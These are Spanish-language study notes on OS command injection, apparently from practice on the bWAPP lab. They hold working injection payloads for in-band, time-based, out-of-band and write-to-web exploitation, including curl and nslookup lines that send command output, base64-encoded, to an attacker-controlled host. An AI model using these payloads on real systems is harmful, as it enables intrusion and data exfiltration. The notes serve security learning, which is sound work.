OS Command Injection
Concepto

OS Command Injection es una vulnerabilidad de la aplicación (no del sistema operativo en sí) que surge cuando una funcionalidad del backend delega parte de su trabajo en el sistema operativo — típicamente invocando binarios del SO mediante funciones como system(), exec() o shell_exec() (en PHP) — y no sanitiza correctamente el input del usuario antes de construir ese comando. El resultado es que un atacante puede inyectar comandos adicionales que el SO ejecuta con los mismos privilegios que el proceso de la aplicación web (normalmente www-data).

Es distinta de Code Injection, donde lo que se ejecuta es código del lenguaje en el que está escrita la aplicación (PHP, Python, etc.), no comandos del SO directamente. Un Code Injection puede escalar a OS Command Injection si el código inyectado llama, a su vez, a una función que ejecuta comandos del sistema.

Dónde buscarla

Cualquier funcionalidad que, por detrás, delega en el sistema operativo en lugar de reimplementar la lógica en el lenguaje de la app:

Resoluciones DNS (nslookup, dig)
Pings / diagnósticos de red (traceroute, port scan)
Conversión o procesamiento de archivos (convert, ffmpeg)
Herramientas de backup/compresión (zip, tar, 7z)
Paneles administrativos con utilidades de sistema expuestas

Distinción importante: el punto de inyección (el input donde escribes) y el punto de ejecución (el comando que el backend construye y pasa al SO) no son el mismo lugar — útil para documentar hallazgos con precisión.

Operadores de concatenación de comandos (Linux)
Operador	Comportamiento
;	Ejecuta ambos comandos en secuencia, sin importar si el primero falla
&&	El segundo se ejecuta solo si el primero tiene éxito
||	El segundo se ejecuta solo si el primero falla
|	La salida del primero se pasa como entrada (stdin) del segundo
&	Ambos se ejecutan (en background el primero)
`cmd` / $(cmd)	Sustitución de comando

Nota: estos operadores son válidos en shells tipo Linux (sh/bash); cmd.exe de Windows usa una sintaxis distinta.

Tipos de explotación
1. Directa / In-band

La salida del comando inyectado vuelve en la misma respuesta HTTP. No requiere técnicas de confirmación adicionales.

Ejemplo practicado (bWAPP, consulta DNS):

www.nsa.gov ; ls -la

Devolvió el listado completo del document root de bWAPP en la misma respuesta.

2. Ciega (Blind) — Time-Based

Cuando no hay salida visible en la respuesta HTTP. Se fuerza un retraso medible en el servidor para confirmar ejecución.

; sleep 10 ;
; ping -c 10 127.0.0.1 ;

Verificación: si la respuesta tarda ~10 segundos en vez de responder de inmediato, el comando se ejecutó en el backend. Se puede medir con Burp Suite (tiempo de respuesta de la petición).

3. Ciega — Out-of-Band (OOB) / OAST

Se obliga al servidor víctima a interactuar con un servidor controlado por el atacante (DNS o HTTP), y se verifica la llegada de esa interacción en los logs del atacante.

; nslookup $(whoami).tu-servidor.com ;
; curl http://tu-ip/ ;

En un laboratorio local (misma red), no hace falta un dominio público ni Burp Collaborator: basta con apuntar directo a la IP propia y escuchar con tcpdump o levantar un servidor HTTP simple.

Practicado: python3 -m http.server 80 en Kali, payloads:

127.0.0.1; curl http://<IP-Kali>/$(whoami)
127.0.0.1; curl http://<IP-Kali>/$(pwd)

Resultado: confirmó usuario www-data y directorio /var/www/bWAPP.

Problema encontrado con ls -la y la solución:

Un payload como curl http://IP/$(ls -la) sin comillas falla por dos motivos en capas distintas:

Word-splitting del shell: la salida de ls -la contiene espacios y saltos de línea; al no estar entre comillas, el shell corta esa salida en múltiples "palabras" y las pasa como argumentos separados a curl — que además acepta múltiples URLs en una sola invocación, generando peticiones parciales/erróneas.
Caracteres no válidos en una URL: aunque se solucione el problema anterior con comillas dobles ("$(ls -la)"), los espacios y saltos de línea no son caracteres válidos dentro de una URL cruda; requerirían URL-encoding, con riesgo de truncamiento o ruptura del parseo HTTP (saltos de línea sin encodear pueden romper la estructura de la petición, ver CRLF injection).

Solución: codificar la salida en base64 antes de exfiltrarla, ya que produce solo caracteres alfanuméricos seguros para una URL:

curl http://IP/$(ls -la | base64 -w0)

(-w0 evita que base64 inserte saltos de línea cada 76 caracteres, que de nuevo romperían el payload). Se decodifica del lado del atacante.

4. Ciega — Write-to-Web (escritura en document root)

Se redirige la salida del comando a un archivo dentro de una ruta servida por el servidor web, y se accede a ese archivo luego por HTTP.

127.0.0.1 ; ls -la > /var/www/bWAPP/resultado.txt

Luego: http://<target>/bWAPP/resultado.txt

Requisitos, en orden secuencial (uno depende del otro):

El usuario del servidor web debe tener permiso de escritura en la ruta — determina si el archivo llega a crearse.
La ruta debe caer dentro del document root — determina si, una vez creado, es alcanzable por una URL.
El archivo necesita permiso de lectura para el proceso que sirve HTTP (si no, 403 aunque exista).

El comando ya se ejecutó en el momento de la inyección; el archivo resultante es texto plano, no necesita permisos de ejecución — solo necesita ser servible como contenido estático.

Checklist de troubleshooting si el payload se ejecuta pero no se ve resultado:

¿El comando realmente se ejecutó? (confirmar con time-based, ej. sleep)
¿Hay permiso de escritura en la carpeta destino?
¿La ruta cae dentro del document root?
¿El archivo tiene permiso de lectura para el proceso HTTP?
Riesgo asociado

